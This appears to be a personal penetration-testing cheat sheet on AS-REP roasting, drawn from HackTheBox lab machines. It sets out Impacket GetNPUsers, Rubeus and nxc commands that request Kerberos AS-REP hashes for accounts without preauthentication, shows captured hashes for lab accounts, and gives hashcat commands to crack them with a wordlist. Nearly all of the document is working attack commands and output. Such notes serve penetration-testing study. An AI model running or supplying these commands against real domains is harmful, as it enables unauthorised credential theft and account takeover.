---
publish: true
created: 2026-01-24T16:14:55.893+05:30
modified: 2026-06-21T19:52:26.268+05:30
---

You could perform this request _without having any valid account_ credentials on target machine.
Requirement - _UF\_DONT\_REQUIRE\_PREAUTH_ has to set.

# user unknown

## Impacket

```
# htb.local is the domain, not machine name.
$ GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local/

/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet      LastLogon            UAC
------------  ------------------------------------------------------  -------------------  -------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2024-09-09 22:08:31  2019-09-23 16:39:47  0x410200



$krb5asrep$23$svc-alfresco@HTB.LOCAL:2962f687cf1550fe1a27afba1e561edb$d7593bb92141f6f86265b77284db169d2ed8a0bd54f910e358e13a60724743a6b060a8ab3f421768deb3708beab77d8ed4ca14a290c07dbf97cac4052a0fc1339bc9f6efc56dd1a92debef96862a57dd64107ec2ede0ea7ce0356bb34bd50ff80a7e8eff30db18657a8178429ec1ff960235051e3622a9fc363a5854f500a09aacd900fee527cb5e338e0d06dabfff12b63fc9e50e9956b0a79219dfa17b8ddbe30bd2a4b1566f3efb8dddba750ab1e72d2dcdee20e38234ba761697a2f40cfcc65a07bea28fa0d7021374d4ff890dc64c903213d8d3ddc02bce1c3323f0064dcbd3ba0e4592
```

or directly save it to file

```
GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local/ -outputfile asrep.txt
```

and crack it.

```
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Rubeus

- With Rubeus

```powershell
Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
```

# user known

you will get TGT if account has UF\_DONT\_REQUIRE\_PREAUTH set.

## impacket

```
$ impacket-GetNPUsers -dc-ip 10.129.95.180 -usersfile users egotistical-bank.local/
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:48e639035af5a9f72715a3fd93e68d74$59426c59edb1b2d4baaba441ddba6157d3b0a4c9c93328fb7c869187a1c35da67f72da140c31cdbe23447d135795f1c500b40329493060efc2a5255f41e580cc043b60410bc844878aa2501c5065a12af7aab78a08a77ed0ae9324e67586c7e45ad085acd48dff62a1270bd90efa6cf526219b315fb46036914e7ab379cc905417c76ac05b763f304fb325e20a9dc662f617690b4121e2d7ef07d78bf02c67d3aaac926c88ae5d2e5f345d1dcac54085b21f1e397f037c79673b3150273ddddf664e7b6064ee5e74665eb0e2897dc34cdfe33343bfe169868d290f49b46a32b962848ffcd79c3b40467d262989d9f87ff7cfb2391992a24debbebb5a9f24fe87
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## NXC

- With nxc

```bash
nxc ldap $IP -u users.txt -p '' --asreproast output.txt
```

```bash
nxc ldap $IP -u user -p password --asreproast output.txt
```

- Crack the Hash

```bash
hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
